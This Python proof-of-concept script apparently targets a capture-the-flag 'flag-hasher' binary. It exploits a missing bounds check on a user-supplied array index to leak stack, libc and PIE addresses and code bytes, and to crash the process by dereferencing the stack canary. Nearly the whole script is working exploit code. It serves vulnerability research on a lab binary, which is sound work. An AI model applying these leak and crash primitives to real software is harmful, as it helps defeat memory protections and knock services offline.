#!/usr/bin/env python3
"""
S3 Primitive Verification PoC for BUG-001
OOB_ARRAY_INDEX_MISSING_BOUNDS_CHECK

Target: /work/workspace/0030-2024-55-flag-hasher-20260909-195252/target
Environment: flag env var must be set (e.g., flag=testflag)

BUG: In the 'Read Hash record' path of main, the user-supplied index
read via scanf('%u') at 0x17d8 is used directly to access hash_array
at [rbp+rax*8-0x490] without any upper/lower bound check. Only a NULL
check on the dereferenced pointer value is performed (test rax,rax at 0x17ed).

Stack layout (rbp-relative):
  rbp-0x490: hash_array[0..15]  (16 entries, 8 bytes each = 0x80 bytes)
  rbp-0x410: text_buf           (0x400 bytes, memset to 0 after each compute)
  rbp-0x008: stack canary
  rbp+0x000: saved rbp          (idx 146)
  rbp+0x008: return address      (idx 147, libc addr)
  rbp+0x028: PIE addr (main)    (idx 151)

Index mapping: idx N accesses [rbp + N*8 - 0x490]
  idx 0-15:   valid hash_array entries (heap pointers to SHA256 digests)
  idx 16-145: text_buf area (always zeroed → NULL → _abort)
  idx 145:    stack canary (random, low byte 0x00, non-NULL → deref → crash)
  idx 146:    saved rbp (stack address → deref → leak stack/libc/PIE addrs)
  idx 147:    return address (libc address → deref → leak libc code bytes)
  idx 151:    PIE address (main → deref → leak .text code bytes)

Primitives verified:
  PRIM-001: INFO_LEAK (OOB index → deref non-NULL stack value → 32 bytes printed)
    - idx 146: deref saved rbp → leaks stack + libc + PIE addresses
    - idx 147: deref return addr → leaks 32 bytes of libc .text code
    - idx 151: deref PIE addr → leaks 32 bytes of PIE .text code (main prologue)
  PRIM-002: CRASH (OOB index → deref canary/invalid value → SIGSEGV)
    - idx 145: deref canary (random unmapped addr) → SIGSEGV
"""

import os
import struct
import subprocess

BINARY = "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target"
ENV = {**os.environ, "flag": "testflag"}


def run_read_idx(idx):
    """Run the binary, select menu option 2 (read), supply index.
    Returns (returncode, stdout_bytes)."""
    stdin_data = f"2\n{idx}\n".encode()
    proc = subprocess.run(
        [BINARY],
        input=stdin_data,
        capture_output=True,
        timeout=10,
        env=ENV,
    )
    return proc.returncode, proc.stdout


def extract_hash_hex(stdout_bytes):
    """Extract the 64-hex-char hash output from stdout.
    Returns the hex string or None if not found."""
    marker = b"Hash - "
    idx = stdout_bytes.find(marker)
    if idx < 0:
        return None
    colon_idx = stdout_bytes.find(b" : ", idx)
    if colon_idx < 0:
        return None
    start = colon_idx + 3
    hex_str = stdout_bytes[start:start + 64]
    try:
        return hex_str.decode("ascii")
    except Exception:
        return None


def hex_to_bytes(hex_str):
    return bytes.fromhex(hex_str)


def extract_qwords(hex_str):
    """Extract 4 little-endian qwords from 64-char hex string."""
    raw = bytes.fromhex(hex_str)
    return [struct.unpack("<Q", raw[i:i + 8])[0] for i in range(0, 32, 8)]


def is_stack_addr(val):
    return 0x00007ff000000000 <= val <= 0x00007fffffffffff


def is_libc_addr(val):
    return 0x00007f0000000000 <= val <= 0x00007fffffffffff


def is_pie_addr(val):
    return 0x0000550000000000 <= val <= 0x00005fffffffffff


print("=" * 70)
print("BUG-001: OOB_ARRAY_INDEX_MISSING_BOUNDS_CHECK")
print("Primitive Verification PoC")
print("=" * 70)

# ============================================================
# PRIM-001: INFO_LEAK via OOB index dereference
#   The attacker selects an OOB index whose slot contains a non-NULL
#   pointer. That pointer is dereferenced and 32 bytes are printed.
#   Multiple indices leak different types of information.
# ============================================================
print("\n--- PRIM-001: INFO_LEAK via OOB index dereference ---")

# --- PRIM-001a: idx 146 (saved rbp → stack/libc/PIE address leak) ---
print("\n  [1a] idx 146 (saved rbp deref → stack/libc/PIE addrs):")
rc_146, out_146 = run_read_idx(146)
hex_146 = extract_hash_hex(out_146)
leak_146_ok = False
if hex_146:
    print(f"    rc={rc_146}, hex={hex_146}")
    qwords = extract_qwords(hex_146)
    leaks = []
    for i, qw in enumerate(qwords):
        kind = "unknown"
        if is_stack_addr(qw):
            kind = "STACK"
            leaks.append(("stack", qw))
        elif is_libc_addr(qw):
            kind = "LIBC"
            leaks.append(("libc", qw))
        elif is_pie_addr(qw):
            kind = "PIE"
            leaks.append(("pie", qw))
        print(f"    [{i}] 0x{qw:016x} ({kind})")
    if leaks:
        leak_146_ok = True
        print(f"    Leaked {len(leaks)} address(es):")
        for kind, val in leaks:
            print(f"      {kind}: 0x{val:016x}")
else:
    print(f"    rc={rc_146}, no hash output")

# --- PRIM-001b: idx 147 (return addr → libc code leak) ---
print("\n  [1b] idx 147 (return addr deref → libc .text code):")
rc_147, out_147 = run_read_idx(147)
hex_147 = extract_hash_hex(out_147)
leak_147_ok = False
if hex_147:
    raw = hex_to_bytes(hex_147)
    print(f"    rc={rc_147}, hex={hex_147}")
    print(f"    32 bytes of libc code at return address location")
    leak_147_ok = True
else:
    print(f"    rc={rc_147}, no hash output")

# --- PRIM-001c: idx 151 (PIE addr → .text code leak) ---
print("\n  [1c] idx 151 (PIE addr deref → PIE .text code):")
rc_151, out_151 = run_read_idx(151)
hex_151 = extract_hash_hex(out_151)
leak_151_ok = False
if hex_151:
    raw = hex_to_bytes(hex_151)
    print(f"    rc={rc_151}, hex={hex_151}")
    if raw[:4] == b"\xf3\x0f\x1e\xfa":
        print(f"    Confirmed: starts with endbr64 (F30F1EFA) = main() prologue")
    leak_151_ok = True
else:
    print(f"    rc={rc_151}, no hash output")

prim1_ok = leak_146_ok or leak_147_ok or leak_151_ok
if prim1_ok:
    print(f"\n  === PRIM-001: VERIFIED ===")
    print(f"  INFO_LEAK confirmed: OOB index dereference leaks non-attacker data")
    parts = []
    if leak_146_ok:
        parts.append("stack/libc/PIE addresses (idx 146)")
    if leak_147_ok:
        parts.append("libc code (idx 147)")
    if leak_151_ok:
        parts.append("PIE code (idx 151)")
    print(f"  Leaked: {', '.join(parts)}")
else:
    print(f"\n  === PRIM-001: FAILED ===")

# ============================================================
# PRIM-002: CRASH via OOB index dereference of canary
#   idx 145 reads the stack canary (random 64-bit value, low byte 0x00).
#   The canary is non-NULL so the NULL check passes.
#   Dereferencing the canary value (random unmapped address) → SIGSEGV.
# ============================================================
print("\n--- PRIM-002: CRASH via idx 145 (canary deref → SIGSEGV) ---")
rc_145, out_145 = run_read_idx(145)
print(f"  Return code: {rc_145}")
# Check if "Hash - 145 : " was printed (meaning we reached the deref)
has_hash_marker = b"Hash - 145" in out_145
print(f"  'Hash - 145 :' printed before crash: {has_hash_marker}")
# rc = -11 (SIGSEGV) or 139 (128 + 11)
if rc_145 == -11 or rc_145 == 139:
    print(f"  Confirmed: SIGSEGV (signal 11) from dereferencing canary value")
    print(f"  === PRIM-002: VERIFIED ===")
    print(f"  Crash at canary dereference (random unmapped address)")
elif rc_145 == 1:
    print(f"  Process exited with code 1 (may be _abort if canary was NULL)")
    print(f"  === PRIM-002: CANDIDATE ===")
else:
    print(f"  Unexpected return code: {rc_145}")
    print(f"  === PRIM-002: CANDIDATE ===")

# ============================================================
# Summary
# ============================================================
print("\n" + "=" * 70)
print("SUMMARY")
print("=" * 70)
print("BUG-001: OOB_ARRAY_INDEX_MISSING_BOUNDS_CHECK")
print("  read_idx from scanf('%u') has NO bounds check.")
print("  Indices >= 16 read beyond hash_array into adjacent stack regions.")
print("  Non-NULL OOB values are dereferenced as pointers, printing 32 bytes.")
print()
print("Primitives:")
if prim1_ok:
    print(f"  PRIM-001: INFO_LEAK → VERIFIED")
    print(f"    OOB index selects stack slot → deref → 32 bytes leaked")
    print(f"    idx 146: stack/libc/PIE addresses")
    print(f"    idx 147: libc .text code bytes")
    print(f"    idx 151: PIE .text code bytes (main prologue)")
if rc_145 == -11 or rc_145 == 139:
    print(f"  PRIM-002: CRASH → VERIFIED")
    print(f"    idx 145: canary deref → SIGSEGV (DoS)")
